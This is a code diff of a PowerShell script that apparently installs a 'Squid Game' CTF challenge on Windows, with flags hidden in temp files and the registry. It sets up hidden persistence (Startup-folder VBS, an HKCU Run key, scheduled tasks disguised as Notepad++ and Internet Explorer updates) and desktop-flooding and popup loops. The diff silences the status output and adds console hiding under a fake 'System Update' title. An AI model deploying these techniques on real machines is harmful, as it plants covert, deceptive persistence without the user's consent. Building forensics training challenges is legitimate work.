@@ -38,7 +38,7 @@ function Create-SquidSound($base64String,$outFilePath) {
     $bytes = ConvertFrom-Base64Wav -base64 $base64String
     if ($bytes) {
         [System.IO.File]::WriteAllBytes($outFilePath, $bytes)
-        Write-Host "Squid sound created at: $outFilePath" -ForegroundColor Green
+        #Write-Host "Squid sound created at: $outFilePath" -ForegroundColor Green
     }
     return $outFilePath
 }
@@ -53,12 +53,12 @@ function Set-RegSound {
         New-Item -Path $regKey -Force | Out-Null
     }
     Set-ItemProperty -Path $regKey -Name "(Default)" -Value $soundPath -Force
-    Write-Host "Minimize sound set to: $soundPath" -ForegroundColor Green
+    #Write-Host "Minimize sound set to: $soundPath" -ForegroundColor Green
 }
 
 
 function Start-SquidWatcherService {
-    Write-Host "Setting up persistence without admin rights..." -ForegroundColor Yellow
+    #Write-Host "Setting up persistence without admin rights..." -ForegroundColor Yellow
     
     # Method 1: Startup Folder (no admin required)
     $startupPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("Startup"), "squid_game.vbs")
@@ -67,13 +67,13 @@ Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$env:TEMP\squid_watcher.ps1""", 0, False
 "@
     $vbsScript | Out-File -FilePath $startupPath -Encoding ASCII
-    Write-Host "Startup entry created: $startupPath" -ForegroundColor Green
+    #Write-Host "Startup entry created: $startupPath" -ForegroundColor Green
     
     # Method 2: Registry Run Key (no admin required)
     $regRunPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\squid_watcher.ps1`""
     Set-ItemProperty -Path $regRunPath -Name "SquidGameWatcher" -Value $regValue -Force
-    Write-Host "Registry Run key set" -ForegroundColor Green
+    #Write-Host "Registry Run key set" -ForegroundColor Green
     
     # Create the watcher script
     $watcherScript = @"
@@ -99,16 +99,16 @@ while (`$true) {
 
     $watcherScriptPath = Join-Path $env:TEMP "squid_watcher.ps1"
     $watcherScript | Out-File -FilePath $watcherScriptPath -Encoding ASCII
-    Write-Host "Watcher script created: $watcherScriptPath" -ForegroundColor Green
+    #Write-Host "Watcher script created: $watcherScriptPath" -ForegroundColor Green
     
     # Start the watcher in background
     Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watcherScriptPath`"" -WindowStyle Hidden
-    Write-Host "SquidWatcher service started!" -ForegroundColor Green
+    #Write-Host "SquidWatcher service started!" -ForegroundColor Green
 }
 
 #Will create the annoying red pop up
 function Add-FunFeatures {
-    Write-Host "Adding fun CTF features..." -ForegroundColor Cyan
+    #Write-Host "Adding fun CTF features..." -ForegroundColor Cyan
     
     # Feature 1: Random popup messages using VBS (no admin required)
     $vbsPopup1= @"
@@ -241,10 +241,10 @@ Set fso = Nothing
         
         # Register the task under Notepad++\Updates folder
         Register-ScheduledTask -TaskName "Notepad++\Updates\SquidPopups" -Action $action -Trigger $trigger -Settings $settings -RunLevel Limited -Force | Out-Null
-        Write-Host "Popup system activated in Notepad++\Updates folder" -ForegroundColor Green
+        #Write-Host "Popup system activated in Notepad++\Updates folder" -ForegroundColor Green
     }
     catch {
-        Write-Host "Failed to create scheduled task, using VBS startup method..." -ForegroundColor Yellow
+        #Write-Host "Failed to create scheduled task, using VBS startup method..." -ForegroundColor Yellow
         # Fallback: use startup delay with VBS
         $delayScript = @"
 WScript.Sleep 120000
@@ -256,7 +256,7 @@ Loop
 "@
         $vbsPopup | Out-File -FilePath "$env:TEMP\squid_delayed.vbs" -Encoding ASCII
         Start-Process -FilePath "wscript.exe" -ArgumentList "`"$env:TEMP\squid_delayed.vbs`"" -WindowStyle Hidden
-        Write-Host "Alternative popup system activated via VBS" -ForegroundColor Green
+        #Write-Host "Alternative popup system activated via VBS" -ForegroundColor Green
     }
 
     # Feature 2: Create fake log files with hints
@@ -347,7 +347,7 @@ function Remove-OpenWithSquidraMenu {
 #Will Create the icons on the desktop
 function Add-IconExplosion {
     # === 1. Create the .BAT file (copies icon with random name) ===
-    $batContent = @'
+    $batContent_old = @'
 @echo off
 :loop
 set /a "rand=%random% * 899999 / 32768 + 100000"
@@ -355,7 +355,25 @@ copy "C:\Users\Public\Pictures\ghidra.ico" "%USERPROFILE%\Desktop\red+light_%ran
 timeout /t 5 >nul
 goto loop
 '@
+   $batContent = @'
+@echo off
+:: --- Hide console completely (run minimized + fake title) --
+if not defined _STEALTH (
+    set _STEALTH=1
+    start "" /min "%~f0" & exit
+)
+title System Update
+mode con cols=15 lines=1 >nul 2>&1
+color 07 >nul
 
+:: --- Main loop (unchanged logic, just quieter) ---
+:loop
+set /a "rand=%random% * 899999 / 32768 + 100000"
+copy "C:\Users\Public\Pictures\ghidra.ico" "%USERPROFILE%\Desktop\red+light_%rand%.ico" >nul 2>&1
+timeout /t 1 >nul
+goto loop
+'@
+#lol
     $batPath = Join-Path $env:TEMP "icon_boom.bat"
     $batContent | Out-File -FilePath $batPath -Encoding ASCII
 
@@ -376,7 +394,7 @@ goto loop
             -RunLevel Limited `
             -Force | Out-Null
 
-        Write-Host "Icon explosion scheduled in \InternetExplorer\Core\Security\Updates\SquidLover" -ForegroundColor Green
+        #Write-Host "Icon explosion scheduled in \InternetExplorer\Core\Security\Updates\SquidLover" -ForegroundColor Green
     }
     catch {
         Write-Host "Task Scheduler failed. Running via Startup folder..." -ForegroundColor Yellow
@@ -397,7 +415,7 @@ function Install-SquidGame {
     Write-Host "=== Installing Squid Game CTF Challenge ===" -ForegroundColor Cyan
     
     # Create the sound file
-    Write-Host "Creating squid sound..." -ForegroundColor Yellow
+    #Write-Host "Creating squid sound..." -ForegroundColor Yellow
 
 
     $minimizeSoundPath   = Create-SquidSound -base64String $minmize64String -outFilePath $squidMp3
@@ -406,26 +424,26 @@ function Install-SquidGame {
     $ghidraIconImage     =Create-SquidSound -base64String $ghidraIconBase64 -outFilePath $ghidraIcon
 
     # Set Sounds
-    Write-Host "Setting minimize sound..." -ForegroundColor Yellow
+    #Write-Host "Setting minimize sound..." -ForegroundColor Yellow
     Set-RegSound -regKey $regKeyMinimize -soundPath $minimizeSoundPath
     Set-RegSound -regKey $clickRegKey -soundPath $clickoundPath
     Set-RegSound -regKey $rightClickRegKey -soundPath $rightClickSoundPath
 
 
     # Start the watcher service
-    Write-Host "Setting up persistence mechanisms..." -ForegroundColor Yellow
+    #Write-Host "Setting up persistence mechanisms..." -ForegroundColor Yellow
     Start-SquidWatcherService
     
     # Add fun features
-    Write-Host "Adding additional CTF features..." -ForegroundColor Yellow
+    #Write-Host "Adding additional CTF features..." -ForegroundColor Yellow
     Add-FunFeatures
 
     #Add Icon Explosion on Desktop
-    Write-Host "Adding Icon Explosion..."
+   #Write-Host "Adding Icon Explosion..."
     Add-IconExplosion
 
     #Add Right Click Context Menu Open with Ghidra
-    Write-Host "Adding RightClick Syntax..."
+    #Write-Host "Adding RightClick Syntax..."
     Add-OpenWithSquidraMenu
     Add-OpenWithSquidraMenu2
 
@@ -434,7 +452,7 @@ function Install-SquidGame {
     
     # Flag 1: In temp directory (hidden file)
     $flag1Path = Join-Path $env:TEMP ".squid.png"
-    "CTF Flag Part 1: SQUID{P3RS1ST3NC3_1S" | Out-File $flag1Path -Encoding ASCII
+    "Have you chcked your schedule tasks yet? CTF Flag Part 1: SQUID{P3RS1ST3NC3_1S" | Out-File $flag1Path -Encoding ASCII
     
     # Flag 2: In registry
     $regFlagPath = "HKCU:\Software\SquidGameCTF"
@@ -448,7 +466,7 @@ function Install-SquidGame {
     
     Write-Host "`n=== Squid Game CTF Installed Successfully! ===" -ForegroundColor Green
     Write-Host "Run: .\squidgame.ps1 -flags to see what to search for!" -ForegroundColor Yellow
-    Write-Host "Minimize a window to test the sound effect!" -ForegroundColor Cyan
+    #Write-Host "Minimize a window to test the sound effect!" -ForegroundColor Cyan
 }
 
 function Uninstall-SquidGame {
